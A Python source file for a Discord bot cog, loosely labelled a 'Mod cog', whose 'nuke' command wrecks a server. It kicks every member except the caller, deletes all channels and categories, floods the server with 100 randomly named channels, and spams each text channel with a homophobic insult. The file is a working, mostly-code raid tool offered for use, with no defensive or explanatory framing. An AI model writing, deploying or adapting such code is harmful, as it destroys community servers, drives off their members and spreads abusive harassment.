"""Module for the Mod cog"""

import secrets
from typing import Any

import discord.ext.commands

DISCORD_MAX_CHANNEL_LIMIT = 50
TOTAL_MESSAGES_PER_CHANNEL = 10


class Nuke(discord.ext.commands.Cog):
    """Class defining the Nuke cog"""

    def __init__(self, bot: Any) -> None:
        self.bot = bot

    @discord.ext.commands.command()
    @discord.ext.commands.has_permissions(kick_members=True)
    async def nuke(self, ctx: Any) -> None:
        """
        Command to nuke an entire server
            1. Kick everyone it can
            2. Delete all existing text/voice channels
            3. Delete all existing categories
            4. Create text/voice channels
            5. Populate every channel with data

        """

        # kicking all possible members
        for member in ctx.guild.members:
            if member != ctx.author:
                try:
                    await member.kick(reason=None)
                except discord.Forbidden:
                    print(f"[-] Failed to kick {member.name}")
                else:
                    print(f"[+] Kicked {member.name}")

        # deleting all channels
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception as error:  # pylint: disable=broad-except
                print(
                    f"[-] Failed to delete channel {channel.name!r}"
                    f" with error {error!r}"
                )
            else:
                print(f"[+] Deleted channel {channel.name}")

        # deleting all categories
        for category in ctx.guild.categories:
            try:
                await category.delete()
            except Exception as error:  # pylint: disable=broad-except
                print(
                    f"[-] Failed to delete category {category.name!r}"
                    f" with error {error!r}"
                )
            else:
                print(f"[+] Deleted category {category.name}")

        # creating spam text/voice channels
        for _ in range(DISCORD_MAX_CHANNEL_LIMIT):

            # create random text channel
            data = secrets.token_hex(32)
            await ctx.guild.create_text_channel(data)
            print(f"[+] Created text channel {data}")

            # create random voice channel
            data = secrets.token_hex(32)
            await ctx.guild.create_voice_channel(data)
            print(f"[+] Created voice channel {data}")

        # spamming channels
        for index in range(TOTAL_MESSAGES_PER_CHANNEL):
            print(f"[*] Spamming each channel, iteration {index}")
            for channel in ctx.guild.channels:
                if str(channel.type) == "text":
                    try:
                        await channel.send("Bungy is ghey")
                    except Exception:  # pylint: disable=broad-except
                        pass

    # @discord.ext.commands.command()
    # async def delete(self, ctx):
    #     # deleting all channels
    #     for channel in ctx.guild.channels:
    #         try:
    #             await channel.delete()
    #         except:
    #             print(f"[-] Failed to delete channel {channel.name}")
    #         else:
    #             print(f"[+] Deleted channel {channel.name}")


def setup(bot: Any) -> None:
    """Adds the cog to the bot"""

    bot.add_cog(Nuke(bot))
